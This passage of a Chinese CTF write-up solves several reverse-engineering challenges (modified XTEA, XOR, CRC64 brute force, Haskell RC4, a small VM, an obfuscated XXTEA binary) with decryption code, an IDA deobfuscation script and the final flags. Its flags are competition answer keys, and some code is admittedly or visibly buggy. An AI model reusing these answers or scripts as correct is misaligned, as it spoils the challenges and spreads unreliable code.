f4ef03ef ^ abab1212 = 5f4411fd\nW3 = W1 ^ W0 --- ad6d5cbd ^ 5f4411fd = f2294d40\nW2 = W1 + W0 --- f2294d40 + 7e11907e = 1703addbe\nW3 = W1 >> W0 --- 703addbe >> 4 = 703addb\nW3 = W1 << W0 --- 703addbe << 7 = 381d6edf00\nW3 = W1 ^ W0 --- 703addb ^ 1d6edf00 = 1a6d72db\nW2 = W0 ^ W3 --- 703addbe ^ 55667788 = 255caa36\nW2 = W1 + W0 --- 1a6d72db + 255caa36 = 3fca1d11\nW3 = W1 >> W0 --- dcdf8283 >> b = 1b9bf0\nW2 = W0 & W3 --- 1b9bf0 & 3 = 0\nW2 = W1 + W0 --- 776f6853 + dcdf8283 = 1544eead6\nW2 = W0 ^ W3 --- 544eead6 ^ 23235566 = 776dbfb0\nW3 = W1 ^ W0 --- 776dbfb0 ^ 3fca1d11 = 48a7a2a1\nW2 = W1 + W0 --- 48a7a2a1 + bfed8b20 = 108952dc1\nW3 = W1 >> W0 --- 8952dc1 >> 5 = 44a96e\nW3 = W1 << W0 --- 8952dc1 << 6 = 2254b7040\nW3 = W1 ^ W0 --- 44a96e ^ 254b7040 = 250fd92e\nW2 = W0 ^ W3 --- 8952dc1 ^ 11223344 = 19b71e85\nW2 = W1 + W0 --- 250fd92e + 19b71e85 = 3ec6f7b3\nW2 = W0 & W3 --- dcdf8283 & 3 = 3\nW2 = W1 + W0 --- 74696564 + dcdf8283 = 15148e7e7\nW2 = W0 ^ W3 --- 5148e7e7 ^ abab1212 = fae3f5f5\nW3 = W1 ^ W0 --- 3ec6f7b3 ^ fae3f5f5 = c4250246\nW2 = W1 + W0 --- c4250246 + 703addbe = 1345fe004\nW3 = W1 >> W0 --- 345fe004 >> 4 = 345fe00\nW3 = W1 << W0 --- 345fe004 << 7 = 1a2ff00200\nW3 = W1 ^ W0 --- 345fe00 ^ 2ff00200 = 2cb5fc00\nW2 = W0 ^ W3 --- 345fe004 ^ 55667788 = 6139978c\nW2 = W1 + W0 --- 2cb5fc00 + 6139978c = 8def938c\nW3 = W1 >> W0 --- 3c3f696a >> b = 787ed\nW2 = W0 & W3 --- 787ed & 3 = 1\nW2 = W1 + W0 --- 656b616d + 3c3f696a = a1aacad7\nW2 = W0 ^ W3 --- a1aacad7 ^ 23235566 = 82899fb1\nW3 = W1 ^ W0 --- 82899fb1 ^ 8def938c = f660c3d\nW2 = W1 + W0 --- f660c3d + 8952dc1 = 17fb39fe\nW3 = W1 >> W0 --- 17fb39fe >> 5 = bfd9cf\nW3 = W1 << W0 --- 17fb39fe << 6 = 5fece7f80\nW3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f\nW2 = W0 ^ W3 --- 17fb39fe ^ 11223344 = 6d90aba\nW2 = W1 + W0 --- fe71a64f + 6d90aba = 1054ab109\nW2 = W0 & W3 --- 3c3f696a & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + 3c3f696a = 9dacc8dc\nW2 = W0 ^ W3 --- 9dacc8dc ^ abab1212 = 3607dace\nW3 = W1 ^ W0 --- 54ab109 ^ 3607dace = 334d6bc7\nW2 = W1 + W0 --- 334d6bc7 + 345fe004 = 67ad4bcb\nW3 = W1 >> W0 --- 67ad4bcb >> 4 = 67ad4bc\nW3 = W1 << W0 --- 67ad4bcb << 7 = 33d6a5e580\nW3 = W1 ^ W0 --- 67ad4bc ^ d6a5e580 = d0df313c\nW2 = W0 ^ W3 --- 67ad4bcb ^ 55667788 = 32cb3c43\nW2 = W1 + W0 --- d0df313c + 32cb3c43 = 103aa6d7f\nW3 = W1 >> W0 --- 9b9f5051 >> b = 1373ea\nW2 = W0 & W3 --- 1373ea & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + 9b9f5051 = fd0cafc3\nW2 = W0 ^ W3 --- fd0cafc3 ^ 23235566 = de2ffaa5\nW3 = W1 ^ W0 --- de2ffaa5 ^ 3aa6d7f = dd8597da\nW2 = W1 + W0 --- dd8597da + 17fb39fe = f580d1d8\nW3 = W1 >> W0 --- f580d1d8 >> 5 = 7ac068e\nW3 = W1 << W0 --- f580d1d8 << 6 = 3d60347600\nW3 = W1 ^ W0 --- 7ac068e ^ 60347600 = 6798708e\nW2 = W0 ^ W3 --- f580d1d8 ^ 11223344 = e4a2e29c\nW2 = W1 + W0 --- 6798708e + e4a2e29c = 14c3b532a\nW2 = W0 & W3 --- 9b9f5051 & 3 = 1\nW2 = W1 + W0 --- 656b616d + 9b9f5051 = 1010ab1be\nW2 = W0 ^ W3 --- 10ab1be ^ abab1212 = aaa1a3ac\nW3 = W1 ^ W0 --- 4c3b532a ^ aaa1a3ac = e69af086\nW2 = W1 + W0 --- e69af086 + 67ad4bcb = 14e483c51\nW3 = W1 >> W0 --- 4e483c51 >> 4 = 4e483c5\nW3 = W1 << W0 --- 4e483c51 << 7 = 27241e2880\nW3 = W1 ^ W0 --- 4e483c5 ^ 241e2880 = 20faab45\nW2 = W0 ^ W3 --- 4e483c51 ^ 55667788 = 1b2e4bd9\nW2 = W1 + W0 --- 20faab45 + 1b2e4bd9 = 3c28f71e\nW3 = W1 >> W0 --- faff3738 >> b = 1f5fe6\nW2 = W0 & W3 --- 1f5fe6 & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + faff3738 = 15c6c96aa\nW2 = W0 ^ W3 --- 5c6c96aa ^ 23235566 = 7f4fc3cc\nW3 = W1 ^ W0 --- 7f4fc3cc ^ 3c28f71e = 436734d2\nW2 = W1 + W0 --- 436734d2 + f580d1d8 = 138e806aa\n```\n\n通过观察可以发现是一个魔改的XTea加密。\n\n通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 **{0x776f6853,0x656b616d,0x616d5f72,0x74696564}** 以及delta值 **0x5f5fe6e7**\n\n写出对应加密的c++代码：\n\n```cpp\nvoid encipher(uint32_t v[2], const uint32_t key[4])\n{\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x5f5fe6e7;\n    for (i = 0; i < 72; i++)\n    {\n        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));\n        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);\n        v0 += tmp2;\n        sum += delta;\n        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));\n        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);\n        v1 += tmp4;\n    }\n    v[0] = v0;\n    v[1] = v1;\n}\n```\n\n解密代码：\n\n```cpp\nvoid decipher(uint32_t v[2], const uint32_t key[4])\n{\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0x5f5fe6e7 * 72, delta = 0x5f5fe6e7;\n    for (i = 0; i < 72; i++)\n    {\n        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));\n        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);\n        v1 -= tmp4;\n        sum -= delta;\n        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));\n        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);\n        v0 -= tmp2;\n    }\n    v[0] = v0;\n    v[1] = v1;\n}\n```\n\n提取chal程序中的密文，进行解密即可。\n\n完整解密代码：\n\n```cpp\n#include <iostream>\n\nvoid decipher(uint32_t v[2], const uint32_t key[4])\n{\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0x5f5fe6e7 * 72, delta = 0x5f5fe6e7;\n    for (i = 0; i < 72; i++)\n    {\n        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));\n        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);\n        v1 -= tmp4;\n        sum -= delta;\n        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));\n        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);\n        v0 -= tmp2;\n    }\n    v[0] = v0;\n    v[1] = v1;\n}\n\nint main()\n{\n    uint32_t key[]{\n        0x776f6853,\n        0x656b616d,\n        0x616d5f72,\n        0x74696564};\n    unsigned int Encflag[8] = {\n        0x696C2E9A, 0x76ADE8E1, 0xE67D5CA4, 0x5C76BD38,\n        0xB7AC0787, 0xBFEA0C65, 0x01C2FF10, 0x6D16FD38};\n    decipher(Encflag, key);\n    decipher((uint32_t *)((uint64_t)Encflag + 8), key);\n    decipher((uint32_t *)((uint64_t)Encflag + 16), key);\n    decipher((uint32_t *)((uint64_t)Encflag + 24), key);\n    printf(\"%.32s\\n\", Encflag);\n    return 0;\n}\n```\n\nXYCTF{fun_un1c0rn_with_4rm64_VM}\n\n### Moon\n\n跟到moon.xor_crypt实际加密处。\n\n![](/images/6-1744626745337-11.png)\n\n发现是进行了单次xor，并加入到一个list中，前后过程不清楚。\n\n断在xor这个命令，运行附加调试，随便输入一串1\n\n![](/images/7-1744626745337-12.png)\n\n![](/images/8-1744626745338-15.png)\n\n发现是输入的'1'和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。\n\n直接断在return处，v20是最后将list转成Bytes的结果。\n\n![](/images/9-1744626745338-13.png)\n\n发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。\n\n![](/images/10-1744626745338-14.png)\n\n继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。\n\n![](/images/11-1744626745338-16.png)\n\nv45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。\n\n![](/images/12-1744626745338-18.png)\n\n那么v9就应该是flag的密文，可以数出一共是要35字节。\n\n![](/images/13-1744626745338-17.png)\n\n重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。\n\n![](/images/14-1744626745338-19.png)\n\n![](/images/15-1744626745338-20.png)\n\n![](/images/16-1744626745338-21.png)\n\n最后在RichCompare处就可以得到xor密文的列表。\n\n![](/images/17-1744626745338-22.png)\n\n将v9的密文与这个数据进行xor即可得到flag。\n\n![](/images/18-1744626745338-23.png)\n\nflag{but_y0u_l00k3d_up_@t_th3_mOOn}\n\n### Dragon\n\n.bc 后缀 \n\n反编译为LLVM IR\n\n```python\nllvm-dis-17 Dragon.bc -o Dragon.ll\n```\n\n分析得知为crc64，以两个为一组进行校验，直接爆破就行\n\n```c++\n#include <stdio.h>\n#include <stdint.h>\n#include <string.h>\n\nuint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) {\n    uint64_t crc = 0xFFFFFFFFFFFFFFFFULL; \n\n    for (uint64_t i = 0; i < length; i++) {\n        crc ^= ((uint64_t)data[i] << 56);\n\n        for (uint64_t j = 0; j < 8; j++) {\n            if (crc & 0x8000000000000000ULL) { \n                crc = (crc << 1) ^ 0x42F0E1EBA9EA3693ULL; \n            }\n            else {\n                crc = crc << 1;\n            }\n        }\n    }\n\n    return ~crc;\n}\n\nint main() {\n    uint64_t enc[12] = {\n       -2565957437423125689, \n        224890624719110086, \n        1357324823849588894, \n        - 8941695979231947288, \n        - 253413330424273460, \n        - 7817463785137710741, \n        - 5620500441869335673, \n        984060876288820705, \n        - 6993555743080142153, \n        - 7892488171899690683, \n        7190415315123037707, \n        - 7218240302740981077\n    };\n    char flag[25] = { 0 };\n    int flag_index = 0;\n\n\n    for (int k = 0; k < 12; k++) {\n        uint64_t target_crc = enc[k];\n        int found = 0;\n        for (unsigned char c1 = 32; c1 < 127 && !found; c1++) {\n            for (unsigned char c2 = 32; c2 < 127 && !found; c2++) {\n                unsigned char test[2] = { c1, c2 };\n                uint64_t crc = calculate_crc64_direct(test, 2);\n                if (crc == target_crc) {\n                    flag[flag_index++] = c1;\n                    flag[flag_index++] = c2;\n                    break;\n                }\n            }\n        }\n    }\n\n    flag[flag_index] = '\\0';\n    printf(\"Decrypted flag: %s\\n\", flag);\n\n    return 0;\n}\n//flag{LLVM_1s_Fun_Ri9h7?}\n```\n\n### Summer\n\nhaskell程序\n\n函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算\n\n浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点\n\n![](/images/31-1744626745338-24.png)\n\nZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数\n\n![](/images/19-1744626745338-25.png)\n\nGHCziInternalziBase也是底层函数，主要关注两个参数\n\n![](/images/20-1744626745338-26.png)\n\n第一个参数的地址处的函数为打印字符串\n\n![](/images/21-1744626745338-27.png)\n\n![](/images/22-1744626745338-28.png)\n\n\n\nGHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc**，**zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 \"flagTable\" 的长度（这里的\"flagTable\" 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）\n\n![](/images/23-1744626745338-29.png)\n\n![](/images/24-1744626745338-30.png)\n\n我们这里就用flag进行测试，一方面是为了查看他的返回值\n\n![](/images/25-1744626745338-31.png)\n\n此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)\n\n![](/images/26-1744626745338-32.png)\n\n另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度\n\n![](/images/27-1744626745338-33.png)\n\n![](/images/28-1744626745338-34.png)\n\n![](/images/29-1744626745338-35.png)\n\n另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在**add     rbx, [rax]** 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为**Klingsor's_Last_Summer**\n\n![](/images/30-1744626745338-36.png)\n\n我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式\n\n![](/images/32-1744626745338-37.png)\n\n![](/images/33-1744626745338-38.png)\n\n然后通过CE调试得到明文和密文，然后得出为rc4+xor\n\n![](/images/34-1744626745338-39.png)\n\n![](/images/35-1744626745338-40.png)\n\nflag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}\n\n### Lake\n\n单步跟到主函数。\n\n![](/images/36-1744626745338-41.png)\n\n这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，\n\n![](/images/37-1744626745338-42.png)\n\n然后接着第二次加密，最后循环比较。\n\n![](/images/38-1744626745338-44.png)\n\n![](/images/39-1744626745338-43.png)\n\n发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。\n\n![](/images/40-1744626745338-45.png)\n\n![](/images/41-1744626745338-46.png)\n\n![](/images/42-1744626745338-48.png)\n\n调试输出：\n\n```cpp\nInput[2] += 12;\nInput[26] -= 85;\nInput[35] -= 12;\nInput[14] += 9;\nInput[27] -= 6;\nInput[6] ^= 5;\nInput[1] ^= 5;\nInput[27] += 14;\nInput[25] += 3;\nInput[26] += 4;\nInput[4] ^= 8;\nInput[3] -= 12;\nInput[12] += 10;\nInput[37] -= 2;\nInput[32] -= 2;\nInput[9] -= 12;\nInput[26] ^= 5;\nInput[4] += 13;\nInput[8] ^= 15;\nInput[10] += 14;\nInput[16] -= 7;\nInput[12] -= 7;\nInput[34] ^= 8;\nInput[21] ^= 10;\nInput[39] -= 126;\nInput[7] += 2;\nInput[15] ^= 3;\nInput[10] ^= 10;\nInput[34] -= 11;\nInput[18] += 8;\nInput[25] += 9;\nInput[14] ^= 6;\nInput[0] ^= 5;\nInput[10] -= 8;\nInput[27] ^= 7;\nInput[13] ^= 6;\nInput[13] ^= 4;\nInput[23] ^= 12;\nInput[34] ^= 14;\nInput[18] += 52;\nInput[38] -= 119;\n```\n\n这也就是第一层加密的解密代码。\n\n第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。\n\n完整解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n\nvoid decrypt_func(unsigned char *data, int len)\n{\n    unsigned char temp[40];\n    memcpy(temp, data, 40);\n\n    for (int i = 0; i < 10; i++)\n    {\n        int base = 4 * i;\n        unsigned char block[4];\n\n        if (base < len)\n        {\n            block[0] = ((temp[base + 2] & 0x1F) << 5) | (temp[base + 3] >> 3);\n            block[1] = (temp[base] >> 3) | ((temp[base + 3] & 0x07) << 5);\n            block[2] = ((temp[base] & 0x07) << 5) | (temp[base + 1] >> 3);\n            block[3] = ((temp[base + 1] & 0x07) << 5) | (temp[base + 2] >> 3);\n\n            for (int j = 0; j < 4 && base + j < len; j++)\n            {\n                data[base + j] = block[j];\n            }\n        }\n    }\n}\n\nint main()\n{\n    unsigned char Input[48] = {\n        0x4A, 0xAB, 0x9B, 0x1B, 0x61, 0xB1, 0xF3, 0x32, 0xD1, 0x8B, 0x73, 0xEB, 0xE9, 0x73, 0x6B, 0x22,\n        0x81, 0x83, 0x23, 0x31, 0xCB, 0x1B, 0x22, 0xFB, 0x25, 0xC2, 0x81, 0x81, 0x73, 0x22, 0xFA, 0x03,\n        0x9C, 0x4B, 0x5B, 0x49, 0x97, 0x87, 0xDB, 0x51};\n\n    decrypt_func(Input, 40);\n    Input[2] += 12;\n    Input[26] -= 85;\n    Input[35] -= 12;\n    Input[14] += 9;\n    Input[27] -= 6;\n    Input[6] ^= 5;\n    Input[1] ^= 5;\n    Input[27] += 14;\n    Input[25] += 3;\n    Input[26] += 4;\n    Input[4] ^= 8;\n    Input[3] -= 12;\n    Input[12] += 10;\n    Input[37] -= 2;\n    Input[32] -= 2;\n    Input[9] -= 12;\n    Input[26] ^= 5;\n    Input[4] += 13;\n    Input[8] ^= 15;\n    Input[10] += 14;\n    Input[16] -= 7;\n    Input[12] -= 7;\n    Input[34] ^= 8;\n    Input[21] ^= 10;\n    Input[39] -= 126;\n    Input[7] += 2;\n    Input[15] ^= 3;\n    Input[10] ^= 10;\n    Input[34] -= 11;\n    Input[18] += 8;\n    Input[25] += 9;\n    Input[14] ^= 6;\n    Input[0] ^= 5;\n    Input[10] -= 8;\n    Input[27] ^= 7;\n    Input[13] ^= 6;\n    Input[13] ^= 4;\n    Input[23] ^= 12;\n    Input[34] ^= 14;\n    Input[18] += 52;\n    Input[38] -= 119;\n    printf(\"%.40s\\n\", Input);\n\n    // flag{L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y} -> flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}\n    return 0;\n}\n```\n\nflag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}\n\n### EzObf\n\nmain_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。\n\n混淆流程：\n\n1. 执行真实指令\n2. call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。\n3. 给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。\n\n之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。\n\ndeobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。\n\n![](/images/43-1744626745338-47.png)\n\ndeobf idc脚本：\n\n```cpp\nstatic NopCode(Addr, Length)\n{\n    auto i;\n    for (i = 0; i < Length; i++)\n    {\n        PatchByte(Addr + i, 0x90);\n    }\n}\n\nstatic rol(value, count, bits = 32)\n{\n    count = count % bits;\n    return ((value << count) | (value >> (bits - count))) & ((1 << bits) - 1);\n}\n\n// 搜索真实汇编代码的下一个地址\nstatic FindEnd(Addr)\n{\n    auto i;\n    for (i = 0; i < 0x90; i++)\n    {\n        auto v = Dword(Addr + i);\n        if (v == 0x5153509C)\n        {\n            return Addr + i;\n        }\n    }\n    return 0;\n}\n\n// 搜索最后的jmp rax指令\nstatic FindJmpRax(Addr)\n{\n    auto i;\n    for (i = 0; i < 0x90; i++)\n    {\n        auto v = Word(Addr + i);\n        if (v == 0xE0FF)\n        {\n            return Addr + i;\n        }\n    }\n    return 0;\n}\n\n// 搜索call $+5\nstatic FindCall(Addr)\n{\n    auto i;\n    for (i = 0; i < 0x90; i++)\n    {\n        auto v = Dword(Addr + i);\n        if (v == 0xE8)\n        {\n            return Addr + i;\n        }\n    }\n    return 0;\n}\n\nstatic main()\n{\n    auto StartAddr = 0x1401F400D;\n    while (1)\n    {\n        // 搜索真实汇编代码的下一个指令地址\n        auto EndAddr = FindEnd(StartAddr);\n        if (EndAddr == 0)\n        {\n            break;\n        }\n        // 真实汇编代码的字节长度\n        auto CodeLength = EndAddr - addr - 13;\n        // 搜索Call $+5\n        auto CallAddr = FindCall(addr + 13 + CodeLength);\n        if (CallAddr == 0)\n        {\n            break;\n        }\n        // call $+5的下一条指令地址，即call时push到栈的返回地址\n        auto CalcAddr = CallAddr + 5;\n        auto ebx = Dword(CalcAddr + 2);\n        auto rol_Value = Byte(CalcAddr + 8);\n        auto Mode = Dword(CalcAddr + 9);\n        ebx = rol(ebx, rol_Value);\n\n        // 搜索最尾部的jmp rax指令地址\n        auto JmpRaxAddr = FindJmpRax(addr);\n        if (JmpRaxAddr == 0)\n        {\n            break;\n        }\n        // 第一部分垃圾指令长度\n        auto TrushCodeLength_1 = CallAddr - (addr + 13 + CodeLength);\n        // 第二部分垃圾指令长度\n        auto TrushCodeLength_2 = JmpRaxAddr - CallAddr + 2;\n        // Nop掉无用的所有代码\n        NopCode(CallAddr, TrushCodeLength_2);\n\n        NopCode(addr, 13);\n\n        NopCode(addr + 13 + CodeLength, TrushCodeLength_1);\n        // 一共两种地址计算，加和减\n        if (Mode == 0xffC32B48)\n        {\n            CalcAddr = CalcAddr - ebx;\n        }\n        if (Mode == 0xffC30348)\n        {\n            CalcAddr = CalcAddr + ebx;\n        }\n        auto JmpCodeAddr = EndAddr;\n        // 计算相对跳转地址\n        auto JmpOffset = CalcAddr - JmpCodeAddr + 5;\n        // 写入jmp指令\n        PatchByte(JmpCodeAddr, 0xE9);\n        PatchDword(JmpCodeAddr + 1, JmpOffset);\n        // jmp的地址为下一次deobf起始地址\n        addr = CalcAddr;\n    }\n}\n```\n\n执行完，把main_0剩余代码都手动nop即可。\n\n![](/images/44-1744626745338-49.png)\n\n然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。\n\n从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。\n\n![](/images/45-1744626745338-50.png)\n\n![](/images/46-1744626745338-51.png)\n\nMain函数原代码：\n\n```cpp\nint __fastcall main_0(int argc, const char **argv, const char **envp)\n{\n  __int64 v3; // rbp\n  __int64 v4; // rdi\n  __int64 i; // rcx\n  _DWORD *v7; // rdi\n  HANDLE CurrentProcess; // rax\n  __int64 v9; // [rsp-20h] [rbp-458h] BYREF\n  _DWORD v10[2]; // [rsp+0h] [rbp-438h] BYREF\n  _BYTE v11[64]; // [rsp+8h] [rbp-430h] BYREF\n  _BYTE *v12; // [rsp+48h] [rbp-3F0h]\n  unsigned int v13; // [rsp+64h] [rbp-3D4h]\n  int v14; // [rsp+84h] [rbp-3B4h]\n  unsigned int v15; // [rsp+A4h] [rbp-394h]\n  int v16; // [rsp+C4h] [rbp-374h]\n  int v17; // [rsp+E4h] [rbp-354h]\n  unsigned int k; // [rsp+104h] [rbp-334h]\n  int v19; // [rsp+124h] [rbp-314h]\n  int v20; // [rsp+144h] [rbp-2F4h]\n  int v21; // [rsp+164h] [rbp-2D4h]\n  _DWORD v22[11]; // [rsp+188h] [rbp-2B0h] BYREF\n  unsigned __int16 v23; // [rsp+1B4h] [rbp-284h]\n  BOOL v24; // [rsp+1D4h] [rbp-264h] BYREF\n  unsigned __int64 j; // [rsp+1F8h] [rbp-240h]\n  unsigned __int64 v26; // [rsp+218h] [rbp-220h]\n  _DWORD v27[12]; // [rsp+238h] [rbp-200h]\n  unsigned __int64 m; // [rsp+268h] [rbp-1D0h]\n  int v29; // [rsp+3F4h] [rbp-44h]\n  unsigned int v30; // [rsp+3F8h] [rbp-40h]\n  int v31; // [rsp+3FCh] [rbp-3Ch]\n  __int64 v32; // [rsp+400h] [rbp-38h]\n  int v33; // [rsp+408h] [rbp-30h]\n  unsigned __int64 v34; // [rsp+410h] [rbp-28h]\n  __int64 v35; // [rsp+428h] [rbp-10h]\n  __int64 v36; // [rsp+430h] [rbp-8h]\n\n  v36 = v3;\n  v35 = v4;\n  v7 = v10;\n  for ( i = 170; i; --i )\n    *v7++ = -858993460;\n  v34 = (unsigned __int64)v10 ^ 0x1401D9000LL;\n  j___CheckForDebuggerJustMyCode(0x1401ED104LL);\n  memset(v11, 0, 0x20u);\n  sub_140087C02(0x1401A1190LL);\n  if ( !IsDebuggerPresent() )\n  {\n    sub_1400868E3();\n    v12 = v11;\n    memset(v22, 0, 0x10u);\n    v23 = 8;\n    v29 = 8;\n    v20 = 12;\n    v15 = 0;\n    v16 = 0x61C88646;\n    v21 = 0x95664B48;\n    v19 = 7;\n    v24 = 0;\n    CurrentProcess = GetCurrentProcess();\n    CheckRemoteDebuggerPresent(CurrentProcess, &v24);\n    if ( !v24 )\n    {\n      j_srand(0xAABBu);\n      for ( j = 0; j < 4; ++j )\n        v22[j] = j_rand();\n      while ( 1 )\n      {\n        v29 = v19--;\n        v30 = v29 != 0;\n        if ( !v30 )\n          break;\n        v15 += v16;\n        v17 = (v15 >> 2) & 3;\n        for ( k = 0; k < v23; ++k )\n        {\n          v26 = __rdtsc();\n          v13 = *(_DWORD *)&v12[4 * ((k + 1) % v23)];\n          v29 = (4 * v13) ^ (*(_DWORD *)&v12[4 * ((k + v23 - 1) % v23)] >> 5);\n          v30 = k + v23 - 1;\n          v31 = ((16 * *(_DWORD *)&v12[4 * (v30 % v23)]) ^ (v13 >> 3)) + v29;\n          v32 = ((unsigned __int8)v17 ^ (unsigned __int8)k) & 3;\n          v33 = (((*(_DWORD *)&v12[4 * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&v12[4 * k];\n          *(_DWORD *)&v12[4 * k] = v33;\n          v14 = v33;\n          if ( __rdtsc() - v26 > 0x83C0 )\n            goto LABEL_20;\n        }\n      }\n      v27[0] = 0xA9934E2F;\n      v27[1] = 0x30B90FA;\n      v27[2] = 0xDCBF1D3;\n      v27[3] = 0x328B5BDE;\n      for ( m = 0; m < 4; ++m )\n      {\n        if ( v27[m] != v10[m + 2] )\n        {\n          sub_140087C02(0x1401A11A8LL);\n          j_system(byte_1401A11A0);\n          goto LABEL_20;\n        }\n      }\n      sub_140087C02(0x1401A11C0LL);\n      j_system(byte_1401A11A0);\n    }\n  }\nLABEL_20:\n  j__RTC_CheckStackVars(&v9, (_RTC_framedesc *)&unk_1401A1140);\n  j___security_check_cookie((unsigned __int64)v10 ^ v34);\n  return sub_1401F8E9B();\n}\n```\n\n很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。\n\n**注：写WP时用的是旧版附件分析，缺失了后面16字节密文**\n\n完整密文数据：\n\n```cpp\n0xa9934e2f, 0x30b90fa, 0xdcbf1d3, 0x328b5bde,\n0x44fab4e, 0x1dcf0051, 0x85ebbe55, 0x93aa773a\n```\n\n解密代码：\n\n```cpp\n#include <iostream>\n#define DELTA 0x61C88646\n#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))\n\nvoid xxtea(uint32_t *v, int n, uint32_t const key[4])\n{\n    uint32_t y, z, sum;\n    unsigned p, rounds, e;\n    if (n > 1) /* Coding Part */\n    {\n        rounds = 7;\n        sum = 0;\n        z = v[n - 1];\n        do\n        {\n            sum += DELTA;\n            e = (sum >> 2) & 3;\n            for (p = 0; p < n - 1; p++)\n            {\n                y = v[p + 1];\n                z = v[p] += MX;\n                if (z == 0xA4F41487)\n                    printf(\"11\\n\");\n                if (y == 0xA4F41487)\n                    printf(\"11\\n\");\n            }\n            y = v[0];\n            z = v[n - 1] += MX;\n\n        } while (--rounds);\n    }\n    else if (n < -1) /* Decoding Part */\n    {\n        n = -n;\n        rounds = 7;\n        sum = rounds * DELTA;\n        y = v[0];\n        do\n        {\n            e = (sum >> 2) & 3;\n            for (p = n - 1; p > 0; p--)\n            {\n                z = v[p - 1];\n                y = v[p] -= MX;\n            }\n            z = v[n - 1];\n            y = v[0] -= MX;\n            sum -= DELTA;\n        } while (--rounds);\n    }\n}\n\nint main()\n{\n    srand(0xAABB);\n    uint32_t key[4]{};\n    uint32_t Enc[]{\n        0xa9934e2f, 0x30b90fa, 0xdcbf1d3, 0x328b5bde,\n        0x44fab4e, 0x1dcf0051, 0x85ebbe55, 0x93aa773a};\n\n    for (int i = 0; i < 4; i++)\n    {\n        key[i] = rand();\n    }\n    xxtea(Enc, -8, key);\n    printf(\"%.32s\\n\", Enc);\n    return 0;\n}\n```\n\nflag{th15_15_51mpLe_obf_R19Ht?}\n\n### 